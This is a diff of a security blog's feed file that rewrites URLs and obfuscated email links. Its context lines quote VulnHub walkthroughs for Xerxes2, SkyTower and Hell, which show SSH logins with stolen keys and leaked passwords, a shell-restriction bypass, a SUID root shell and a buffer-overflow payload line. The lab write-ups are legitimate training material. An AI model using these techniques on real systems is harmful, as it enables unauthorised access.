+2014-05-31 12:45:57 1WqmPt-0000dB-Bi => korenchkin <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x72;&#x6f;&#111;&#116;&#64;&#120;&#101;&#x72;&#120;&#x65;&#x73;&#x32;&#46;&#116;&#x72;&#x69;&#x6f;&#112;&#116;&#105;&#x6d;&#117;&#x6d;">&#114;&#111;&#111;&#x74;&#x40;&#120;&#x65;&#114;&#120;&#101;&#115;&#50;&#46;&#116;&#114;&#105;&#111;&#x70;&#x74;&#105;&#x6d;&#x75;&#x6d;</a> R=local_user T=mail_spool
 ]0;korenchkin@x
 korenchkin
 korenchkin
@@ -5046,7 +5046,7 @@ polito@xerxes2:~/korenchkin$
 <p>Looks like Korenchkin is sensible and backs up his keypair&hellip; but now I have it, so user impersonation is possible.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#107;&#x6f;&#114;&#x65;&#110;&#99;&#104;&#107;&#105;&#110;&#64;&#49;&#50;&#x37;&#46;&#x30;&#46;&#x30;&#x2e;&#x31;">&#x6b;&#111;&#114;&#101;&#x6e;&#x63;&#104;&#107;&#x69;&#x6e;&#64;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;</a>
+polito@xerxes2:~/korenchkin$ ssh -i .ssh/id_rsa <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#107;&#x6f;&#114;&#101;&#110;&#x63;&#x68;&#107;&#x69;&#x6e;&#64;&#49;&#x32;&#x37;&#46;&#x30;&#x2e;&#x30;&#46;&#49;">&#x6b;&#x6f;&#114;&#101;&#110;&#x63;&#104;&#107;&#105;&#110;&#64;&#49;&#x32;&#55;&#46;&#48;&#46;&#x30;&#46;&#x31;</a>
 The authenticity of host &lsquo;127.0.0.1 (127.0.0.1)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -5318,7 +5318,7 @@ korenchkin@xerxes2:~/a$ /tmp/rootshell</p>
 <p>Well, what do you know - a binary owned by root with the SUID attribute set that drops us to a root shell. I&rsquo;ll echo my SSH key into authorized_keys for completeness, and SSH in as root and cat the /root/flag.txt file</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#114;&#111;&#111;&#x74;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#46;&#49;&#48;&#x32;">&#x72;&#x6f;&#111;&#116;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#48;&#46;&#49;&#x30;&#x32;</a></p>
+root@pwk:~# ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#114;&#x6f;&#111;&#x74;&#64;&#49;&#x39;&#50;&#46;&#49;&#x36;&#56;&#46;&#x30;&#46;&#49;&#48;&#x32;">&#114;&#111;&#x6f;&#116;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#x30;&#x2e;&#x31;&#48;&#x32;</a></p>
 
 <p>Welcome to xerxes2.
       XERXES wishes you
@@ -5370,9 +5370,9 @@ Ping me on #vulnhub for thoughts and comments!
   
   <entry>
     <title type="html"><![CDATA[I Climbed the SkyTower, But No Rapunzel :(]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/08/05/i-climbed-the-skytower-but-no-rapunzel/"/>
+    <link href="http://recrudesce.github.io/2014/08/05/i-climbed-the-skytower-but-no-rapunzel/"/>
     <updated>2014-08-05T23:49:01+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/08/05/i-climbed-the-skytower-but-no-rapunzel</id>
+    <id>http://recrudesce.github.io/2014/08/05/i-climbed-the-skytower-but-no-rapunzel</id>
     <content type="html"><![CDATA[<p>SkyTower is available from <a href="http://vulnhub.com/entry/skytower-1,96/">Vulnhub</a>, and is a quick brain teaser that everyone is encouraged to try. It doesn&rsquo;t take long, so it&rsquo;s fun to see if you can do in your lunchbreak. The walkthrough is going to be short and sweet - maybe with a few GIFs thrown in for good measure.</p>
 
 <!-- more -->
@@ -5464,12 +5464,12 @@ tcp        0      0 0.0.0.0:222             0.0.0.0:*               LISTEN      
 <p>Let us SSH into it with the provided credentials</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6a;&#111;&#104;&#110;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;">&#x6a;&#x6f;&#104;&#x6e;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a> -p 222
+root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#58;&#x6a;&#111;&#x68;&#x6e;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#46;&#48;&#46;&#x31;">&#106;&#111;&#104;&#x6e;&#64;&#x31;&#50;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x31;</a> -p 222
 The authenticity of host &lsquo;[127.0.0.1]:222 ([127.0.0.1]:222)&rsquo; can&rsquo;t be established.
 ECDSA key fingerprint is f6:3b:95:46:6e:a7:0f:72:1a:67:9e:9b:8a:48:5e:3d.
 Are you sure you want to continue connecting (yes/no)? yes
 Warning: Permanently added &lsquo;[127.0.0.1]:222&rsquo; (ECDSA) to the list of known hosts.
-<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#58;&#106;&#111;&#104;&#x6e;&#x40;&#49;&#50;&#55;&#46;&#48;&#46;&#x30;&#46;&#x31;">&#106;&#x6f;&#x68;&#110;&#x40;&#49;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;</a>&rsquo;s password:
+<a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x6a;&#111;&#104;&#110;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#x2e;&#48;&#46;&#49;">&#106;&#x6f;&#x68;&#110;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#48;&#46;&#49;</a>&rsquo;s password:
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -5486,8 +5486,8 @@ root@pwk:~#[/plain]</p>
 
 <p>Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x6f;&#104;&#x6e;&#x40;&#49;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#x2e;&#x31;">&#x6a;&#x6f;&#x68;&#x6e;&#64;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
-<a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#106;&#x6f;&#104;&#x6e;&#64;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#49;">&#x6a;&#x6f;&#104;&#x6e;&#x40;&#49;&#50;&#55;&#46;&#48;&#46;&#48;&#x2e;&#49;</a>&rsquo;s password: hereisjohn
+<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#106;&#x6f;&#x68;&#110;&#x40;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#48;&#x2e;&#x31;">&#106;&#x6f;&#104;&#x6e;&#64;&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;</a> -p 222 -t &ldquo;/bin/sh&rdquo;
+<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6a;&#111;&#x68;&#110;&#x40;&#x31;&#x32;&#x37;&#46;&#48;&#x2e;&#x30;&#x2e;&#x31;">&#x6a;&#111;&#104;&#110;&#64;&#49;&#x32;&#55;&#46;&#x30;&#x2e;&#48;&#46;&#49;</a>&rsquo;s password: hereisjohn
 john@SkyTower:~$[/plain]</p>
 
 <p>First things first, that SQLi filter - what did it look like in it&rsquo;s entirety ?</p>
@@ -5534,9 +5534,9 @@ mysql> show tables;
 +&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
 | id | email               | password     |
 +&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
-|  1 | <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#106;&#x6f;&#104;&#x6e;&#64;&#115;&#x6b;&#x79;&#116;&#x65;&#99;&#x68;&#46;&#x63;&#111;&#109;">&#106;&#111;&#104;&#110;&#64;&#115;&#x6b;&#121;&#x74;&#x65;&#99;&#x68;&#x2e;&#x63;&#111;&#x6d;</a>    | hereisjohn   |
-|  2 | <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#115;&#x61;&#x72;&#x61;&#x40;&#x73;&#x6b;&#x79;&#x74;&#x65;&#x63;&#x68;&#x2e;&#99;&#x6f;&#109;">&#x73;&#97;&#114;&#97;&#x40;&#x73;&#107;&#121;&#x74;&#101;&#99;&#104;&#x2e;&#99;&#x6f;&#x6d;</a>    | ihatethisjob |
-|  3 | <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x77;&#105;&#108;&#108;&#x69;&#97;&#x6d;&#x40;&#115;&#107;&#121;&#116;&#x65;&#x63;&#x68;&#46;&#x63;&#x6f;&#109;">&#x77;&#105;&#108;&#108;&#105;&#x61;&#x6d;&#x40;&#x73;&#x6b;&#x79;&#116;&#101;&#x63;&#x68;&#x2e;&#x63;&#x6f;&#109;</a> | senseable    |
+|  1 | <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x6a;&#111;&#104;&#x6e;&#64;&#115;&#107;&#x79;&#x74;&#x65;&#99;&#104;&#46;&#99;&#111;&#109;">&#x6a;&#111;&#104;&#x6e;&#x40;&#115;&#x6b;&#121;&#x74;&#101;&#99;&#x68;&#46;&#x63;&#x6f;&#109;</a>    | hereisjohn   |
+|  2 | <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#x73;&#x61;&#114;&#x61;&#x40;&#x73;&#107;&#x79;&#116;&#101;&#x63;&#x68;&#46;&#99;&#111;&#109;">&#x73;&#x61;&#114;&#97;&#x40;&#x73;&#x6b;&#x79;&#116;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#109;</a>    | ihatethisjob |
+|  3 | <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#x77;&#105;&#108;&#108;&#105;&#97;&#x6d;&#64;&#x73;&#107;&#121;&#x74;&#x65;&#x63;&#x68;&#x2e;&#x63;&#111;&#x6d;">&#119;&#x69;&#x6c;&#x6c;&#x69;&#97;&#x6d;&#x40;&#115;&#x6b;&#x79;&#x74;&#101;&#99;&#104;&#x2e;&#99;&#111;&#109;</a> | senseable    |
 +&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&ndash;+
 3 rows in set (0.00 sec)</p>
 
@@ -5563,8 +5563,8 @@ john@SkyTower:~$
 <p>We&rsquo;re hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#x73;&#97;&#x72;&#97;&#64;&#49;&#x32;&#x37;&#46;&#x30;&#46;&#48;&#46;&#49;">&#x73;&#x61;&#114;&#97;&#x40;&#x31;&#x32;&#55;&#x2e;&#x30;&#46;&#48;&#46;&#x31;</a> -p 222 -t /bin/sh
-<a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#115;&#97;&#x72;&#x61;&#64;&#49;&#50;&#55;&#46;&#48;&#46;&#x30;&#46;&#49;">&#115;&#97;&#x72;&#97;&#x40;&#49;&#x32;&#x37;&#46;&#48;&#46;&#48;&#x2e;&#x31;</a>&rsquo;s password: ihatethisjob
+root@pwk:~# ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#115;&#97;&#114;&#97;&#64;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#49;">&#x73;&#97;&#114;&#x61;&#64;&#49;&#50;&#55;&#46;&#48;&#x2e;&#48;&#46;&#x31;</a> -p 222 -t /bin/sh
+<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#115;&#x61;&#114;&#97;&#64;&#x31;&#50;&#x37;&#46;&#48;&#46;&#48;&#46;&#49;">&#115;&#97;&#114;&#97;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;</a>&rsquo;s password: ihatethisjob
 $[/plain]</p>
 
 <p><img src="http://i.imgur.com/PbksBXu.gif" alt="" /></p>
@@ -5598,9 +5598,9 @@ root@SkyTower:/home/sara# [/plain]</p>
   
   <entry>
     <title type="html"><![CDATA[Hell Walkthrough – Part 5]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/07/21/hell-walkthrough-part-5/"/>
+    <link href="http://recrudesce.github.io/2014/07/21/hell-walkthrough-part-5/"/>
     <updated>2014-07-21T22:14:03+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/07/21/hell-walkthrough-part-5</id>
+    <id>http://recrudesce.github.io/2014/07/21/hell-walkthrough-part-5</id>
     <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | Part 5</p>
 
 <p>This is the last step. The last hoop that needs to be jumped through. The last wall of hurdles between me and root. LET&rsquo;S DO THIS !</p>
@@ -5691,9 +5691,9 @@ $ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo
   
   <entry>
     <title type="html"><![CDATA[Hell Walkthrough - Part 4]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/07/20/hell-walkthrough-part-4/"/>
+    <link href="http://recrudesce.github.io/2014/07/20/hell-walkthrough-part-4/"/>
     <updated>2014-07-20T19:46:02+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/07/20/hell-walkthrough-part-4</id>
+    <id>http://recrudesce.github.io/2014/07/20/hell-walkthrough-part-4</id>
     <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | Part 4 | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>
 
 <p>Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn&rsquo;t I ?</p>
@@ -5718,8 +5718,8 @@ No password or keyfile specified.[/plain]</p>
 <p>Looking around a bit more, it looks like George has also signed up for RockYou</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-From: <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x61;&#x64;&#109;&#105;&#110;&#64;&#x72;&#x6f;&#x63;&#x6b;&#x79;&#111;&#x75;&#x2e;&#99;&#x6f;&#109;">&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#114;&#x6f;&#x63;&#107;&#121;&#x6f;&#117;&#x2e;&#99;&#x6f;&#x6d;</a>
-To: <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x73;&#117;&#112;&#101;&#114;&#x5f;&#97;&#100;&#109;&#x69;&#x6e;&#x40;&#104;&#101;&#108;&#x6c;&#46;&#99;&#111;&#109;">&#x73;&#117;&#x70;&#x65;&#114;&#95;&#x61;&#100;&#109;&#105;&#x6e;&#x40;&#104;&#x65;&#x6c;&#108;&#46;&#x63;&#x6f;&#109;</a>
+From: <a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#97;&#x64;&#109;&#105;&#110;&#64;&#x72;&#111;&#x63;&#107;&#x79;&#x6f;&#x75;&#x2e;&#x63;&#111;&#109;">&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#x72;&#x6f;&#99;&#x6b;&#121;&#111;&#117;&#x2e;&#x63;&#x6f;&#109;</a>
+To: <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x73;&#117;&#112;&#101;&#114;&#95;&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x68;&#101;&#x6c;&#108;&#x2e;&#x63;&#111;&#109;">&#115;&#x75;&#x70;&#101;&#x72;&#x5f;&#x61;&#x64;&#x6d;&#105;&#110;&#64;&#x68;&#101;&#108;&#x6c;&#46;&#99;&#111;&#x6d;</a>
 Subject: Account Activation
 Date: 13th November 2009</p>
 
@@ -5766,7 +5766,7 @@ george@hell:~/tc$ [/plain]</p>
 <p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-george@hell:~/tc$ ssh <a href="&#109;&#97;&#x69;&#x6c;&#116;&#111;&#58;&#x62;&#97;&#x7a;&#x7a;&#97;&#x40;&#x31;&#x32;&#55;&#x2e;&#48;&#46;&#48;&#46;&#x31;">&#x62;&#x61;&#122;&#x7a;&#x61;&#64;&#49;&#50;&#x37;&#x2e;&#x30;&#46;&#48;&#x2e;&#49;</a> -i ./id_rsa
+george@hell:~/tc$ ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#98;&#x61;&#x7a;&#122;&#97;&#x40;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#x31;">&#x62;&#x61;&#x7a;&#x7a;&#97;&#x40;&#x31;&#50;&#x37;&#x2e;&#48;&#46;&#48;&#x2e;&#x31;</a> -i ./id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -5912,9 +5912,9 @@ oj
   
   <entry>
     <title type="html"><![CDATA[Hell Walkthrough - Part 3]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3/"/>
+    <link href="http://recrudesce.github.io/2014/07/19/hell-walkthrough-part-3/"/>
     <updated>2014-07-19T20:05:34+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/07/19/hell-walkthrough-part-3</id>
+    <id>http://recrudesce.github.io/2014/07/19/hell-walkthrough-part-3</id>
     <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | Part 3 | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>
 
 <h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>
@@ -6081,9 +6081,9 @@ $
   
   <entry>
     <title type="html"><![CDATA[Hell Walkthrough – Part 2]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/07/18/hell-walkthrough-part-2/"/>
+    <link href="http://recrudesce.github.io/2014/07/18/hell-walkthrough-part-2/"/>
     <updated>2014-07-18T21:27:04+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/07/18/hell-walkthrough-part-2</id>
+    <id>http://recrudesce.github.io/2014/07/18/hell-walkthrough-part-2</id>
     <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | Part 2 | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>
 
 <p>So, yesterday we got a shell on Hell as www-data. Today we&rsquo;ll escalate through some of the users on our quest to root.  If you&rsquo;ve not read <a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a>, I suggest you do so now.  I&rsquo;ll wait.  Go on, don&rsquo;t be shy, I&rsquo;ll still be here when you get back.</p>
@@ -6192,7 +6192,7 @@ $
 $ gpg &ndash;import .pgp/pgp.priv
 gpg: key 3F18AB0A: secret key imported
 gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
-gpg: key 3F18AB0A: public key &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x6a;&#97;&#99;&#x6b;&#64;&#99;&#111;&#x77;&#x6c;&#x6f;&#118;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;">&#106;&#x61;&#x63;&#107;&#x40;&#99;&#x6f;&#x77;&#108;&#111;&#x76;&#101;&#114;&#115;&#x2e;&#x63;&#x6f;&#x6d;</a>&rdquo; imported
+gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#106;&#97;&#99;&#x6b;&#64;&#x63;&#111;&#119;&#x6c;&#111;&#118;&#x65;&#114;&#x73;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x61;&#x63;&#x6b;&#64;&#99;&#111;&#119;&#108;&#111;&#x76;&#x65;&#114;&#x73;&#x2e;&#99;&#111;&#x6d;</a>&rdquo; imported
 gpg: Total number processed: 1
 gpg:               imported: 1  (RSA: 1)
 gpg:       secret keys read: 1
@@ -6200,14 +6200,14 @@ gpg:   secret keys imported: 1
 $ gpg -o email.txt /var/mail/jack/received/message.eml</p>
 
 <p>You need a passphrase to unlock the secret key for
-user: &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#106;&#x61;&#x63;&#x6b;&#x40;&#99;&#x6f;&#x77;&#108;&#x6f;&#118;&#101;&#114;&#x73;&#46;&#99;&#111;&#x6d;">&#106;&#97;&#99;&#x6b;&#x40;&#x63;&#x6f;&#119;&#108;&#111;&#118;&#101;&#114;&#x73;&#x2e;&#x63;&#111;&#x6d;</a>&rdquo;</p>
+user: &ldquo;<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#106;&#97;&#x63;&#x6b;&#x40;&#x63;&#x6f;&#119;&#108;&#x6f;&#118;&#x65;&#x72;&#x73;&#x2e;&#x63;&#111;&#109;">&#106;&#x61;&#x63;&#107;&#64;&#99;&#111;&#119;&#108;&#x6f;&#x76;&#x65;&#x72;&#x73;&#46;&#99;&#x6f;&#x6d;</a>&rdquo;</p>
 
 <p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>
 
 <p>Enter passphrase: g0tmi1k69
 gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
-      &ldquo;<a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#106;&#97;&#99;&#107;&#64;&#x63;&#111;&#x77;&#x6c;&#111;&#118;&#101;&#x72;&#x73;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#97;&#99;&#107;&#64;&#x63;&#x6f;&#x77;&#x6c;&#x6f;&#x76;&#101;&#114;&#x73;&#46;&#99;&#x6f;&#109;</a>&rdquo;
+      &ldquo;<a href="&#x6d;&#97;&#x69;&#108;&#x74;&#111;&#x3a;&#106;&#x61;&#99;&#107;&#x40;&#x63;&#111;&#119;&#108;&#111;&#118;&#x65;&#114;&#x73;&#x2e;&#x63;&#111;&#109;">&#106;&#x61;&#99;&#x6b;&#64;&#x63;&#111;&#x77;&#x6c;&#111;&#118;&#x65;&#x72;&#x73;&#46;&#99;&#x6f;&#x6d;</a>&rdquo;
 gpg: WARNING: message was not integrity protected
 $ cat email.txt
 Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>
@@ -6231,9 +6231,9 @@ $ [/plain]</p>
   
   <entry>
     <title type="html"><![CDATA[Hell Walkthrough - Part 1]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1/"/>
+    <link href="http://recrudesce.github.io/2014/07/17/hell-walkthrough-part-1/"/>
     <updated>2014-07-17T20:37:23+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1</id>
+    <id>http://recrudesce.github.io/2014/07/17/hell-walkthrough-part-1</id>
     <content type="html"><![CDATA[<p>Part 1 | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>
 
 <p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>
@@ -6299,7 +6299,7 @@ MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
 <p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
-CeWL 5.0 Robin Wood (<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x72;&#x6f;&#x62;&#x69;&#110;&#x40;&#x64;&#105;&#x67;&#x69;&#110;&#105;&#110;&#x6a;&#x61;&#x2e;&#111;&#x72;&#x67;">&#x72;&#111;&#98;&#105;&#x6e;&#64;&#100;&#x69;&#x67;&#x69;&#110;&#x69;&#110;&#106;&#97;&#46;&#111;&#x72;&#x67;</a>) (www.digininja.org)</p>
+CeWL 5.0 Robin Wood (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#98;&#x69;&#x6e;&#64;&#100;&#x69;&#x67;&#x69;&#x6e;&#x69;&#x6e;&#106;&#97;&#46;&#x6f;&#114;&#x67;">&#x72;&#x6f;&#98;&#105;&#110;&#x40;&#x64;&#105;&#103;&#x69;&#110;&#x69;&#110;&#x6a;&#x61;&#x2e;&#111;&#114;&#103;</a>) (www.digininja.org)</p>
 
 <p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
 Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
@@ -6408,9 +6408,9 @@ $ [/plain]</p>
   
   <entry>
     <title type="html"><![CDATA[Hell Walkthrough]]></title>
-    <link href="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough/"/>
+    <link href="http://recrudesce.github.io/2014/07/17/hell-walkthrough/"/>
     <updated>2014-07-17T16:17:18+01:00</updated>
-    <id>http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough</id>
+    <id>http://recrudesce.github.io/2014/07/17/hell-walkthrough</id>
     <content type="html"><![CDATA[<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>
 
 <p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.</p>
@@ -6474,7 +6474,7 @@ MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>
 <p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
